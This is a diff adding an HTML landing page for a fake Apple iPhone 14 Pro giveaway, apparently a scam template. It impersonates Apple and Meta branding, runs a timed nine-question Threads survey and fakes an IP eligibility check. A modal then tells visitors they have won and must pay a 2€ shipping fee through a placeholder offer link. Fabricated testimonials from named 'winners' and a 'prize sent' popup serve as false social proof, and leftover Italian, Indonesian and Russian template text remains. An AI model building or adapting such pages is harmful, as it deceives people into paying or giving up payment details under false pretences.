@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<base href=".">
+	<title>Apple</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+
+	<meta name="robots" content="noindex, follow">
+	<link rel="stylesheet" type="text/css" href="./assets/styles.min.css">
+	<link rel="preload" href="./assets/bootstrap.min.css" as="style" />
+	<link rel="preload" href="./assets/jquery-3.6.0.min.js" as="script" />
+	<link rel="preload" href="./assets/bootstrap.min.js" as="style" />
+	<link rel="preload" href="./assets/bootstrap.min.js" as="script" />
+
+	<link rel="icon" type="image/gif" href="./assets/favico.png">
+
+	<link rel="stylesheet" href="./assets/swiper.css">
+	<link rel="stylesheet" href="./assets/all.min.css">
+	<link rel="stylesheet" href="./assets/bootstrap.min.css">
+	<link href="./assets/css.css" rel="stylesheet">
+	
+	<script>
+		var portal = "it";
+		var theme = "9-coop";
+		var template = "surbox";
+		var brand_country = "Republic of South Africa";
+		var dayNames = Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+		var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+		var img_regalo = "./principal-it.png";
+		var minutos_y = ": ";
+		var segundos = "";
+		var modalOptions = {
+			backdrop: "static",
+			keyboard: false,
+		};
+	</script>
+	
+	<style type="text/css">
+		.content {
+			background: #ffffff;
+			max-width: 800px;
+			width: 100%;
+			margin: 0 auto;
+		}
+
+		.text-primary {
+			color: #c82311;
+		}
+		@media (max-width: 500px){
+			.comment-content img{
+				width: 100% !important;
+			}
+		}
+		#starttimer {
+			text-transform: uppercase;
+			color: #fff;
+			font-weight: bold;
+		}
+		.caja_gift img {
+			margin-top: 50% !important;
+			width: 57% !important;
+		}
+		.was-get-prise {
+			position: fixed;
+			display: flex;
+			align-items: center;
+			width: 280px;
+			right: 15px;
+			bottom: 15px;
+			background-color: #fff;
+			z-index: 20000000;
+			box-shadow: 0 8px 24px rgb(0 0 0 / 25%);
+			padding: 15px;
+			line-height: 1;
+		}
+		.block-with-brands {
+			display: flex;
+			justify-content: center;
+		}
+		.block-with-brands img {
+			max-height: 300px;
+			height: 100%;
+			width: auto;
+		}
+	</style>
+	<link rel="stylesheet" type="text/css" href="./assets/header.css">
+</head>
+<header id="id1">
+	<div class="container">
+		<div class="desctop">
+			<a href="#p_body_content">Instagram</a>
+			<a href="#p_body_content">Threads</a>
+			<a href="#p_body_content">Facebook</a>
+			<a href="#p_body_content">WhatsApp</a>
+			<a href="#p_body_content"><img src="./assets/img/meta.svg" alt="search"></a>
+			<a href="#p_body_content">Facebook Messenger</a>
+			<a href="#p_body_content">Facebook Custom Audience</a>
+		</div>
+		<div class="mobile">
+			<a href="#p_body_content" class="menu">
+				<span class="first-line"><span></span></span>
+				<span class="second-line"><span></span></span>
+			</a>
+			<a href="#p_body_content"><img src="./assets/img/apple.svg" alt="apple"></a>
+			<a href="#p_body_content"><img src="./assets/img/bag.svg" alt="bag"></a>
+		</div>
+	</div>	
+</header>
+	<body bis_register="">
+		<div id="p_body_content" bis_skin_checked="1" style="padding-top: 40px;">
+			<div class="content" bis_skin_checked="1">
+				<div style="display: none; margin: 0 0 12px 0;" bis_skin_checked="1">
+					<div class="header_flex_item" bis_skin_checked="1">Hadiah terkirim!<i class="far fa-bell"></i></div>
+					<div class="header_flex_item" style="text-align: right;" bis_skin_checked="1"></div>
+				</div>
+				<div class="main-content flag" id="content1" bis_skin_checked="1">
+					  <h3 style="font-weight: bold;">Take the survey and get a chance to win an iPhone 14 Pro! </h3>
+					<p>
+						Apple is giving valuable prizes to 100 lucky participants!
+						<br><br>
+					</p>
+					<div class="block-with-brands">
+						<img src="./assets/ThreadsAnimation.gif" alt="photo">	
+					</div>
+					<br>
+					<p>
+						To attract new clients, we are launching a new seasonal promotion! Only the first 100 lucky people will receive an iPhone.
+					</p>			
+					<p>
+						Here's what you need to do: answer the survey to improve our customer service and get a chance to win an iPhone!
+					</p>
+					<p><strong>There are only two minutes to answer the quiz.</strong></p>
+					<p id="timerwrap" style="display: none;">
+						<font color="red">
+							<b><span id="timerr" style="color: #c82311;"></span></b>
+						</font>
+					</p>
+					<p><strong>Hurry, the number of prizes is limited!</strong></p>
+					<a class="survey_button startform1" data-bq="1" id="starttimer" style="">Begin</a>
+					<div class="main-content flag" id="content1" bis_skin_checked="1">
+						<div id="q1" style="display: none;" bis_skin_checked="1">
+							<p class="question"><strong>Question 1 of 9</strong><br><br>
+								Are you 18 years old?
+							</p>
+							<a class="survey_button bq1" data-bq="1" href="javascript:void(0);">Yes</a>
+							<a class="survey_button bq1" data-bq="1" href="javascript:void(0);">No</a>
+						</div>
+						<div id="q2" bis_skin_checked="1">
+							<p class="question"><strong>Question 2 of 9</strong><br><br>
+								What social networks do you use?
+							</p>
+							<a class="survey_button bq2" data-bq="1" href="javascript:void(0);">Instagram</a>
+							<a class="survey_button bq2" data-bq="1" href="javascript:void(0);">Threads</a>
+							<a class="survey_button bq2" data-bq="1" href="javascript:void(0);">Telegram</a>
+						</div>
+						<div id="q3" bis_skin_checked="1">
+							<p class="question"><strong>Question 3 of 9</strong><br><br>
+								How did you find out about Threads?
+							</p>
+							<a class="survey_button bq3" data-bq="1" href="javascript:void(0);">Ads</a>
+							<a class="survey_button bq3" data-bq="1" href="javascript:void(0);">Bloger</a>
+						</div>
+						<div id="q4" bis_skin_checked="1">
+							<p class="question"><strong>Question 4 of 9</strong><br><br>
+								Would you like to see ads in Threads?
+							</p>
+							<a class="survey_button bq4" data-bq="1" href="javascript:void(0);">Yes</a>
+							<a class="survey_button bq4" data-bq="1" href="javascript:void(0);">No</a>
+						</div>
+						<div id="q5" bis_skin_checked="1">
+							<p class="question"><strong>Question 5 of 9</strong><br><br>
+								What features would you like to see in Threads?
+							</p>
+							<a class="survey_button bq5" data-bq="1" href="javascript:void(0);">Posts</a>
+							<a class="survey_button bq5" data-bq="1" href="javascript:void(0);">Edit</a>
+							<a class="survey_button bq5" data-bq="1" href="javascript:void(0);">Storys</a>
+							<a class="survey_button bq5" data-bq="1" href="javascript:void(0);">Other</a>
+						</div>
+						<div id="q6" bis_skin_checked="1" style="display: none;">
+							<p class="question"><strong>Question 6 of 9</strong><br><br>
+								What do you like best?
+							</p>
+							<a class="survey_button bq6" data-bq="1" href="javascript:void(0);">Threads</a>
+							<a class="survey_button bq6" data-bq="1" href="javascript:void(0);">Twitter</a>
+						</div>
+						<div id="q7" bis_skin_checked="1" style="display: none;">
+							<p class="question"><strong>Question 7 of 9</strong><br><br>
+								Would you like to see a web version of Threads?
+							</p>
+							<a class="survey_button bq7" data-bq="1" href="javascript:void(0);">Yes</a>
+							<a class="survey_button bq7" data-bq="1" href="javascript:void(0);">No</a>
+						</div>
+						<div id="q8" bis_skin_checked="1" style="display: none;">
+							<p class="question"><strong>Question 8 of 9</strong><br><br>
+								Do you like Threads?
+							</p>
+							<a class="survey_button bq8" data-bq="1" href="javascript:void(0);">Yes</a>
+							<a class="survey_button bq8" data-bq="1" href="javascript:void(0);">No</a>
+						</div>
+						<div id="q9" bis_skin_checked="1" style="display: none;">
+							<p class="question"><strong>Question 9 of 9</strong><br><br>
+								Elon Musk or Zukeberg?
+							</p>
+							<a class="survey_button bq9" data-bq="1" href="javascript:void(0);">Elon Musk</a>
+							<a class="survey_button bq9" data-bq="1" href="javascript:void(0);">Zukeberg</a>
+						</div>
+					</div>
+					<link rel="stylesheet" type="text/css" href="./assets/style.min.css.1.1.css">
+					<style type="text/css">
+						.survey_button {
+							background-color: rgba(0,0,0,0.8);
+						}
+					</style>
+				</div>
+				<div class="main-content" id="content2" bis_skin_checked="1">
+					<h2 style="text-align: center;">Please wait, your answer is being processed...</h2>
+					<div class="d-flex justify-content-center" bis_skin_checked="1">
+						<div class="spinner-border" role="status" bis_skin_checked="1"><span class="sr-only">Loading...</span></div>
+					</div>
+					<p class="result" id="result1">You have answered 9 out of 9 questions!</p>
+					<p class="result" id="result2">There is no previous survey with this IP.</p>
+					<p class="result" id="result3">There are still prizes available!</p>
+				</div>
+				<div class="main-content" id="content3" bis_skin_checked="1">
+					<script>
+						var box_ini = false; /* we will start later */
+					</script>
+					
+					<style type="text/css">
+						/* .boxes {
+						background-image: url(box-bigbg.jpg);
+					} */
+					</style>
+					<!-- Сюда вставить опрос -->
+					
+					<div id="p_modal1" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true" bis_skin_checked="1">
+						<div class="modal-dialog" role="document" bis_skin_checked="1">
+							<div class="modal-content" bis_skin_checked="1">
+								<div class="modal-body" bis_skin_checked="1">
+									<img loading="lazy" src="./assets/box-04.png">
+									<h2>Congratulations!</h2>
+									<p style="color: green; font-weight: bold;">You have won an iPhone 14 Pro!</p>
+									<p style="color: green; font-weight: bold;">1. Click OK below to access the shipping page.</p>
+									<p style="color: green; font-weight: bold;">2. Fill in your address and pay the 2€ (40 R) shipping fee to receive your prize.</p>
+									<p style="color: green; font-weight: bold;">3. Your prize will be delivered within 2-3 days.</p>
+									<a class="p_modal_button" href="{offer}">
+										OK
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="main-content" bis_skin_checked="1">
+					
+					<div class="comments_face" bis_skin_checked="1">
+						<div class="comments" bis_skin_checked="1">
+							<p style="margin: 0; padding: 0; float: left; display: block; width: 50%;"><span style="color: #3b5998;">Reviews</span></p>
+							<p style="margin: 0; padding: 0; float: right; display: block; width: 50%; color: #a8a7a7; text-align: right;">7 di 24</p>
+							<div style="clear: both;" bis_skin_checked="1"></div>
+						</div>
+						<div class="comments" id="comment0" style="display: block;" bis_skin_checked="1">
+							<div class="profile" bis_skin_checked="1"><img loading="lazy" src="./assets/1.jpg" width="60" height="60" ></div>
+							<div class="comment-content" bis_skin_checked="1">
+								<p class="name">Nomvula Ndlovu</p>
+								<p>I am very happy to have participated in this promotion and received a new iPhone! I feel very lucky to be one of the winners.
+									The shipping process was very fast, it only took two days for the iPhone to arrive in my hands. Thank you very much to the organizers of this event!</p>
+								<img loading="lazy" src="./assets/iphone.jpg" width="400" height="300" style="max-width: 200px; width: 100%; margin-bottom: 10px;">
+							</div>
+							<div class="clr" bis_skin_checked="1"></div>
+							<div class="comment-status" bis_skin_checked="1">
+								<span>Like · Reply <img loading="lazy" src="./assets/like.png" width="15px" height="15px"> 20</span> · <span class="p_var-dia">15</span>&nbsp;<span class="p_var-mes_nombre">febbraio</span>,
+								<span class="p_var-anyo">2023</span>
+							</div>
+						</div>
+						<div class="comments" id="comment1" style="display: block;" bis_skin_checked="1">
+							<div class="profile" bis_skin_checked="1"><img loading="lazy" src="./assets/2.jpg" width="60" height="60" ></div>
+							<div class="comment-content" bis_skin_checked="1">
+								<p class="name">Lerato Mokoena</p>
+								<p>I can't stop smiling upon receiving my prize.
+									Thank you Apple and good luck to those who participated)</p>
+											</div>
+							<div class="clr" bis_skin_checked="1"></div>
+							<div class="comment-status" bis_skin_checked="1">
+								<span>Like · Reply <img loading="lazy" src="./assets/like.png" width="15px" height="15px"> 47</span> · <span class="p_var-dia">9</span>&nbsp;<span class="p_var-mes_nombre">febbraio</span>,
+								<span class="p_var-anyo">2023</span>
+							</div>
+						</div>
+						<div class="comments" id="comment2" style="display: block;" bis_skin_checked="1">
+							<div class="profile" bis_skin_checked="1"><img loading="lazy" src="./assets/3.jpg" width="60" height="60"></div>
+							<div class="comment-content" bis_skin_checked="1">
+								<p class="name">Thandiwe Khumalo</p>
+								<p>I never thought that participating in a survey could bring such a big prize. Thank you so much, Apple!</p>
+								<img loading="lazy" src="./assets/iphone_1.jpg" width="400" height="271" style="max-width: 200px; width: 100%; margin-bottom: 10px;">
+							</div>
+							<div class="clr" bis_skin_checked="1"></div>
+							<div class="comment-status" bis_skin_checked="1">
+								<span>Like · Reply <img loading="lazy" src="./assets/like.png" width="15px" height="15px"> 3</span> · <span class="p_var-dia">16</span>&nbsp;<span class="p_var-mes_nombre">febbraio</span>,
+								<span class="p_var-anyo">2023</span>
+							</div>
+						</div>
+						<div class="comments" id="comment3" style="display: block;" bis_skin_checked="1">
+							<div class="profile" bis_skin_checked="1"><img loading="lazy" src="./assets/4.jpg" width="60" height="60"></div>
+							<div class="comment-content" bis_skin_checked="1">
+								<p class="name">Mpho Modise</p>
+								<p>Thank you, Apple! I just received the iPhone prize after completing their survey.
+									I am very excited and can't wait to use it.</p>
+							</div>
+							<div class="clr" bis_skin_checked="1"></div>
+							<div class="comment-status" bis_skin_checked="1">
+								<span>Like · Reply <img loading="lazy" src="./assets/like.png" width="15px" height="15px"> 19</span> · <span class="p_var-dia">17</span>&nbsp;<span class="p_var-mes_nombre">febbraio</span>,
+								<span class="p_var-anyo">2023</span>
+							</div>
+						</div>
+						<div class="comments" id="comment4" style="display: block;" bis_skin_checked="1">
+							<div class="profile" bis_skin_checked="1"><img loading="lazy" src="./assets/5.jpg" width="60" height="60"></div>
+							<div class="comment-content" bis_skin_checked="1">
+								<p class="name">Nomvula Zulu</p>
+								<p>cool</p>
+							</div>
+							<div class="clr" bis_skin_checked="1"></div>
+							<div class="comment-status" bis_skin_checked="1">
+								<span>Like · Reply <img loading="lazy" src="./assets/like.png" width="15px" height="15px"> 26</span> · <span class="p_var-dia">17</span>&nbsp;<span class="p_var-mes_nombre">febbraio</span>,
+								<span class="p_var-anyo">2023</span>
+							</div>
+						</div>
+						<div class="comments" id="comment5" style="display: block;" bis_skin_checked="1">
+							<div class="profile" bis_skin_checked="1"><img loading="lazy" src="./assets/6.jpg" width="60" height="60"></div>
+							<div class="comment-content" bis_skin_checked="1">
+								<p class="name">Rita Williams</p>
+								<p>I always buy Apple products and now I feel very lucky to receive an iPhone prize from them. 
+									The prize claim process was also very easy and fast. Thank you, Apple!</p>
+								<img loading="lazy" src="./assets/iphone_3.jpg" width="400" height="225" style="max-width: 280px; width: 100%; margin-bottom: 10px;">
+							</div>
+							<div class="clr" bis_skin_checked="1"></div>
+							<div class="comment-status" bis_skin_checked="1">
+								<span>Like · Reply <img loading="lazy" src="./assets/like.png" width="15px" height="15px"> 8</span> · <span class="p_var-dia">17</span>&nbsp;<span class="p_var-mes_nombre">febbraio</span>,
+								<span class="p_var-anyo">2023</span>
+							</div>
+						</div>
+					</div>
+					<p style="font-size: 12px; color: #bcbcbc;"></p>
+				</div>
+			</div>
+		</div>
+		
+		<script src="./assets/jquery-3.6.0.min.js"></script>
+
+		<script defer src="./assets/bootstrap.min.js"></script>
+		<script defer src="./assets/template.min.js"></script>
+		<script defer src="./assets/popper.min.js"></script>
+		<script defer src="./assets/box.js"></script>
+		<script defer src="./assets/swiper.js"></script>
+		<script defer src="./assets/script.js"></script>
+		<script src="./assets/p.min.js"></script>
+		
+	<script>
+		$(document).ready(function() {
+			$('.btn-final').on('click', function(event) {
+			  event.preventDefault();
+			  document.location.href = '/click.php?lp=1';
+			});
+		});
+	</script>
+
+	<div class="was-get-prise" style="display: none;">
+		<div class="image-wrap">
+			<img loading="lazy" src="./assets/partying-face_1f973.png" alt="photo" style="width: 40px; margin-right: 15px;">
+		</div>
+		<div class="name-with-city">
+			<p class="name" style="margin-bottom: 5px;">Mpho Modise</p>	
+			<div class="city">Pretoria</div>
+			<p style="font-weight: bold; color: green; margin-top: 10px; margin-bottom: 0;">The prize has been sent!</p>
+		</div>
+	</div>
+
+</body>
+</html>
